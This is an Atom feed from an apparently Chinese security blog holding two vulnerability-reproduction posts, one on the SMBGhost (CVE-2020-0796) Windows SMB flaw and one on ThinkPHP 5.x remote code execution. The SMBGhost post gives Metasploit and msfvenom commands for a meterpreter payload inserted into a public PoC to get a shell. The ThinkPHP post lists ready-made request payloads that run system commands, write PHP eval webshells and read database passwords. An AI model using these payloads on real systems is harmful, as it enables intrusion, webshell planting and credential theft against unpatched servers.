<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blogs</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-10T08:20:55.369Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Administratorrs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows：CVE-2020-0796 RCE 漏洞复现</title>
    <link href="http://example.com/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/"/>
    <id>http://example.com/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/</id>
    <published>2021-02-10T06:48:07.000Z</published>
    <updated>2021-02-10T08:20:55.369Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、影响范围（需关闭-Win10-防火墙）："><a href="#一、影响范围（需关闭-Win10-防火墙）：" class="headerlink" title="一、影响范围（需关闭 Win10 防火墙）："></a>一、影响范围（需关闭 Win10 防火墙）：</h2><ul><li>Windows 10 Version 1903 for 32-bit Systems</li><li>Windows 10 Version 1903 for ARM64-based Systems</li><li>Windows 10 Version 1903 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)<br></li></ul><hr><h2 id="二、漏洞复现："><a href="#二、漏洞复现：" class="headerlink" title="二、漏洞复现："></a>二、漏洞复现：</h2><p><strong>环境准备：</strong></p><ul><li>kali，ip：192.168.201.152（攻击机）</li><li>受影响版本的Win10，ip：192.168.201.132（须关闭防火墙）</li></ul><p><strong>漏洞检测工具下载地址：</strong></p><ul><li><p><a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p></li><li><ul><li><strong>漏洞检测工具使用方法：</strong></li></ul></li><li><ul><li><code>pythone3 scanner.py 192.168.0.0/24</code></li></ul></li></ul><p><strong>PoC下载地址：</strong></p><ul><li><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p></li><li><ul><li><strong>POC 使用方法：</strong></li></ul></li><li><ul><li><code>python3.8 exploit.py -ip 192.168.201.132</code><br></li></ul></li></ul><hr><h2 id="三、漏洞复现："><a href="#三、漏洞复现：" class="headerlink" title="三、漏洞复现："></a>三、漏洞复现：</h2><p>1、先对使用kali对 9999 端口进行监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 9999</span><br><span class="line">set rhost 192.168.201.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>![](Windows：CVE-2020-0796 RCE/1.png)</p><p>2、kali 使用 msf 生成木马（此处端口需跟监听的端口是一致的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;9999 -b &#39;\x00&#39; -i 1 -f python&gt;test.py</span><br></pre></td></tr></table></figure><p>木马生成后的内容为：<br>![](Windows：CVE-2020-0796 RCE/2.png)</p><p>下载好的 POC：<br>![](Windows：CVE-2020-0796 RCE/3.png)</p><p>3、先把木马的内的 buf 替换为 USER_PAYLOAD ，再替换 exploit.py 内的 USER_PAYLOAD 行的内容</p><ul><li>:set nu       &emsp;&emsp;// 显示行</li><li>:91,127s/buf/USER_PAYLOAD    &emsp;&emsp;// 把91-127行的 buf 替换为 USER_PAYLOAD</li></ul><p>![](Windows：CVE-2020-0796 RCE/4.png)</p><p>4、使用 Python3 运行（在此处需按一次回车）<br>![](Windows：CVE-2020-0796 RCE/5.png)<br>![](Windows：CVE-2020-0796 RCE/6.png)</p><p>5、此时监听的 9999 端口已收到访反弹的 shell</p><ul><li>// 如未收到反弹的 Shell 则使用 Python 重新运行一次 POC</li></ul><p>![](Windows：CVE-2020-0796 RCE/7.png)<br>![](Windows：CVE-2020-0796 RCE/8.png)</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、影响范围（需关闭-Win10-防火墙）：&quot;&gt;&lt;a href=&quot;#一、影响范围（需关闭-Win10-防火墙）：&quot; class=&quot;headerlink&quot; title=&quot;一、影响范围（需关闭 Win10 防火墙）：&quot;&gt;&lt;/a&gt;一、影响范围（需关闭 Win10 防火墙</summary>
      
    
    
    
    <category term="Windows 漏洞复现" scheme="http://example.com/categories/Windows-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.0.2 - 5.0.23 RCE 漏洞复现</title>
    <link href="http://example.com/2021/02/10/ThinkPHP/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/"/>
    <id>http://example.com/2021/02/10/ThinkPHP/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/</id>
    <published>2021-02-10T06:48:07.000Z</published>
    <updated>2021-02-10T08:21:19.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>ThinkPHP5 5.0.2 - 5.0.23</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br>![](ThinkPHP5 5.0.23/1.jpg)</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、访问 <a href="http://127.0.0.1/thinkphp/public/index.php?s=captcha">http://127.0.0.1/thinkphp/public/index.php?s=captcha</a> 并抓包</p><p>2、构建 POC 并发包<br>![](ThinkPHP5 5.0.23/2.png)</p><p>3、使用蚁剑连接<br>![](ThinkPHP5 5.0.23/3.png)</p><p>POC：<br>通过发包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Linux）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo &quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot; &gt; 1.php</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Windows）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo ^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt; &gt; 1.php</span><br></pre></td></tr></table></figure><p>通过 URL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  查看数据库用户名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.username</span><br><span class="line"></span><br><span class="line">#  查看数据库密码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;.|think\config&#x2F;get&amp;name&#x3D;database.password</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  phpinfo</span><br><span class="line">index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="其他版本-POC"><a href="#其他版本-POC" class="headerlink" title="其他版本 POC"></a>其他版本 POC</h3><h4 id="当-PHP7-以上无法使用-Assert-的时候用"><a href="#当-PHP7-以上无法使用-Assert-的时候用" class="headerlink" title="当 PHP7 以上无法使用 Assert 的时候用"></a>当 PHP7 以上无法使用 Assert 的时候用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;包含&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><h5 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\View&#x2F;display&amp;content&#x3D;%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data&#x3D;1</span><br></pre></td></tr></table></figure><h5 id="ThinkPHP-5-0-21"><a href="#ThinkPHP-5-0-21" class="headerlink" title="ThinkPHP 5.0.21"></a>ThinkPHP 5.0.21</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_5.0.21&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><h5 id="ThinkPhP-5-1"><a href="#ThinkPhP-5-1" class="headerlink" title="ThinkPhP 5.1.*"></a>ThinkPhP 5.1.*</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter&#x3D;system&amp;data&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;to&#x2F;thinkphp5.1.29&#x2F;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cmd</span><br></pre></td></tr></table></figure><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到5.0.24及以上，不开启debug模式</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a><br><a href="https://blog.csdn.net/qq_29647709/article/details/84956221">https://blog.csdn.net/qq_29647709/article/details/84956221</a><br><a href="https://www.freebuf.com/vuls/194127.html">https://www.freebuf.com/vuls/194127.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2</summary>
      
    
    
    
    <category term="ThinkPHP 漏洞复现" scheme="http://example.com/categories/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
</feed>
